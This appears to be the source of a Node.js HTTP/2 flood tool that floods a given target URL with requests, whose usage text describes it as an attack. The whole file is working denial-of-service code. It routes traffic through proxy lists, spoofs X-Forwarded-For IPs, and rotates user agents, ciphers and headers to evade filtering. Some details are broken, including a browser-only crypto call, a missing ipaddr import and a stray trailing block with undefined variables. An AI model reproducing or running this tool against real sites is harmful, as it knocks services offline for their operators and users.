const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
request = require('request'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
randstr = require('randomstring'),
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
"AES256-SHA256:AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
"ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
"AES128-GCM-SHA256:AES128-SHA:DHE-RSA-AES128-SHA",
"ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305",
"AES256-GCM-SHA384:AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
"ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],

accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],

lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',]



encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
],

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],

ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];

const headerFunc = {
  accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  },
  lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  },
  encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
  },
  controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
  },
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  }
}

function spoof() {
    return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}`;
}

function randomByte() {
  let buffer = new Uint8Array(1);
  window.crypto.getRandomValues(buffer);
  return buffer[0];
}

function randomIp() {
  let segments = [];
  for (let i = 0; i < 4; i++) {
    segments.push(Math.floor(Math.random() * 256));
  }
  return segments.join('.');
}

process.on('uncaughtException', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    // console.warn(e);
}).on('unhandledRejection', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).on('warning', e => {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).setMaxListeners(0);



function isPrivate(ip, privateRanges) {
  if (!ip) {
    throw new Error('IP address is required');
  }
  if (!privateRanges || !Array.isArray(privateRanges)) {
    privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
  }
  const ipRange = ipaddr.parse(ip);
  for (let i = 0; i < privateRanges.length; i++) {
    const range = ipaddr.parseCIDR(privateRanges[i]);
    if (ipRange.match(range)) {
      return true;
    }
  }
  return false;
}


const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
 console.error('Error: Please provide the following arguments:');
    console.error('  target: The target URL to attack.');
    console.error('  time: The duration of the attack in seconds.');
    console.error('  thread: The number of threads to use for the attack.');
    console.error('  proxylist: The path to a file containing a list of proxies to use for the attack.');
    console.error('  rps: The maximum number of requests per second to send. Max 512');
    console.error(`Example: node ${process.argv[1]} http://example.com/ 60 10 proxy.txt 100`);
  process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('Target URL must start with http:// or https://');
  process.exit(1);
}

// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error reading proxy file:', err.message);
  process.exit(1);
}

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('RPS must be a positive number');
  process.exit(1);
}


const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
    const currentDate = new Date();
    // ...



console.log(`SUCCESS: Attack sent successfully! | Target: ${target} | Duration: ${time} seconds | Threads: ${thread} | Requests per second: ${rps} |`);

  for (let _ of Array.from({length: thread})) {
  cluster.fork();
}
   setTimeout(() => process.exit(-1), time * 1000);


} else {


     function flood() {

        var parsed = url.parse(target);

        const uas = fakeua();

        var cipper = headerFunc.cipher();

        var proxy = proxyr().split(':');
        var cookie = request.jar();

        var randIp = randomIp();

       var header = {
            ":method": "GET",
            ":authority": parsed.host,
            ":path": parsed.path,
            ":scheme": "https",
            "X-Forwarded-For": randIp,
            "user-agent": uas,
            "Origin": target,
            "accept": headerFunc.accept(),
            "accept-encoding": headerFunc.encoding(),
            "accept-language": headerFunc.lang(),
            "referer": target,
            "Upgrade-Insecure-Requests": "1",
            "cache-control": "max-age=0"
        }



     const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity
        });

      var req = http.request({
  host: proxy[0],
  agent: agent,
  globalAgent: agent,
  port: proxy[1],
  headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'Keep-Alive',
    'Connection': 'Keep-Alive',
  },
  method: 'CONNECT',
  path: parsed.host + ':443',
  keepAlive: true,
  keepAliveMsecs: 50000
}, (res) => {
  // Handle response
});



req.on('connect', function (res, socket, head) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                ciphers: cipper,
                port: 443,
                servername: parsed.host,
                echdCurve: "GREASE:X25519:x25519",
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
                sessionTimeout: 5000,
                socket: socket,
            }, () => {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false
                    }
                }, function (session) {
                    for (let i = 0; i < rps; i++) {
                        const req = session.request(header);
                        req.setEncoding('utf8');

                        req.on('data', (chunk) => {
                            // data += chunk;
                        });
                        req.on("response", (res) => {
                            req.close();
                        })
                        req.end().on('error', () => {});
                    }
                });

            })

        });

        req.end();

    }

    setInterval(() => {
        flood()
    })
}

const client = http2.connect(parsed.href, clientOptions, function() {
  // handle successful connection
});
